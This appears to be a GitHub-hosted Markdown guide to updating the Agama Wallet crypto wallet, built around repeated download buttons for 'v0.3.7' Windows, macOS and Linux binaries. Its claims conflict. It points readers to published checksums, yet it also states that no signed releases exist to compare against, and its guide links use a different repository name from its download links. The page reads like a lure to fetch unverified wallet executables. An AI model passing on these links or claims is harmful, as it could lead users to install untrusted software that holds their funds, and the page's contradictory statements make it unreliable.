[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Updating Agama Wallet: What to Expect

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

Updating Agama Wallet means installing a newer build over or alongside the current one; there is no published changelog, so the version number is the only signal of what changed. The current build is 0.3.7, published on 2026-11-15 from a public repository, and the project's own fixes for stubborn problems include updating, restarting and reinstalling. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps.

## You'll see this if

The wallet is misbehaving, you have been told an update fixes it, and there is nothing published that says what the update contains.

| Situation | What updating can do | What it cannot do |
|---|---|---|
| A UI bug or redirect during trading | Replace the build that has the bug | Tell you which bug was fixed |
| Sync problems | Sometimes help, if the fix is in the build | Replace a local chain problem |
| Missing assets | Add support the new build implements | Add support that does not exist |
| Lost access | Nothing | Recover a phrase you no longer have |

## Why it happens

Updates are how software fixes defects, and this wallet's own troubleshooting guidance puts updating first: slow Native-mode sync, a stuck wallet, and the older EasyDEX interface issue where the wallet redirected during trading, all with updating named as a remedy.

What is missing is the record. No release notes, changelog or version history exists in the archive or on any linked page, so a user cannot know what a new build changed, whether a fix applies to their problem, or whether a regression was introduced. The version number on the download page is the only published fact.

That gap has a practical consequence: an update is a decision made without information. It is still usually the right decision when something is broken, because the alternative is running a build with a known defect.

## Fix

Update deliberately, and protect the thing that actually matters.

1. **Back up first, and test the backup.** A wallet file plus a recorded phrase, and one restored check; [backing up an Agama wallet](https://github.com/agama-wallet/agama-wallet/blob/main/backup-what-dat-covers.md) covers what each form protects.
2. **Note the current version** before changing anything, so you can tell whether the install took effect.
3. **Take the new build from the same place as the old one.** Switching sources mid-update is how a malicious build gets in.
4. **Install, then confirm the version** in the interface or the application's information panel.
5. **Open the wallet and check a balance** before assuming the update worked; a launch is not a working wallet, and a version string is not a working sync.
6. **If it is worse, reinstall the previous build if you kept it**, or restore from the phrase into the current one.

[Agama Wallet download](https://github.com/agama-wallet/agama-wallet/blob/main/download-and-install.md) covers what the page offers and what it does not publish.

## If that did not work

If the update will not install, the cause is usually the platform or a package left behind by the old version. Uninstall cleanly, then install again; the phrase is what preserves access, not the application folder.

If the new build launches but shows no balance, the wallet may be re-scanning. [Zero balance after restoring](https://github.com/agama-wallet/agama-wallet/blob/main/zero-balance-after-restore.md) covers the order of checks.

If a problem persists after updating, the site's remaining remedies are restarting and reinstalling. If those fail too, the issue is not the build.

If an update arrives as a message, an email or a download link you did not seek out, do not install it; [is Agama Wallet safe](https://github.com/agama-wallet/agama-wallet/blob/main/is-it-safe-to-use.md) explains why an unverified binary is the risk. With no signed releases to compare against, an unsolicited update cannot be distinguished from an attack.

## Prevention

- **Keep the previous installer until the new one works.** It is the only rollback available.
- **Record versions and dates.** Without a changelog, your own log is the only history.
- **Never update with the phrase typed anywhere.** No update requires it; a page that asks is phishing.
- **Check the version after every install.** A silent no-op install is common when the old version is still registered in the operating system.
- **Read the site's own fix list before updating.** [Native vs SPV mode](https://github.com/agama-wallet/agama-wallet/blob/main/native-versus-spv-mode.md) explains why some sync problems are not build problems.

## What the project says is coming

The project states that the developer team has approved release notes, system requirements and a mobile build for the next version (recorded 2026-11-13). The release page and published hash values on the same list have since shipped in 0.3.7, so two of the five items are delivered and three are not.

No date, version number or artefact accompanies the statement, so nothing about the procedure above changes yet. When a build appears, confirm its version, keep the installer until the new one works, and check the published value against the file before running it.

## FAQ

### How do I know if an update is available?

Check the download page's version. There is no in-app update feed or changelog that announces one.

### Will updating keep my funds?

Updating replaces software, not keys. Your funds stay on the chain, and your phrase or wallet file restores access if the install goes wrong.

### What changed in 0.3.7?

Nothing published describes the changes. The version string is the only difference you can verify.

### Does updating change my address or balance?

No. Keys and derivation are unchanged by the software version, so addresses and balances stay the same. If an updated wallet shows a different balance, the difference is in what it scanned rather than in what exists.

### Why is there no changelog?

Nothing published records what changed between versions, so there is no answer to give; the project states the next version will ship with release notes. The practical response is to keep your own note of the version you installed and the date, which is the only history available to you.

### Can I downgrade after updating?

Only with the previous installer, which is why keeping it matters. Without it, the way back is a reinstall of whatever the site currently offers plus a restore from your backup.

### Should I update if nothing is broken?

The trade-off is a known bug against an unknown change. With no release notes, either choice is defensible, which is why keeping a backup and the previous installer matters more than the update itself.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [Agama Wallet Download and Install: What Is Available](https://github.com/agama-wallet/agama-wallet/blob/main/download-and-install.md)
- [Agama Wallet Backup: What wallet.dat Covers](https://github.com/agama-wallet/agama-wallet/blob/main/backup-what-dat-covers.md)
- [Agama Wallet Shows Zero Balance: Causes and Checks](https://github.com/agama-wallet/agama-wallet/blob/main/zero-balance-after-restore.md)
- [Native Mode vs SPV Mode in Agama Wallet](https://github.com/agama-wallet/agama-wallet/blob/main/native-versus-spv-mode.md)
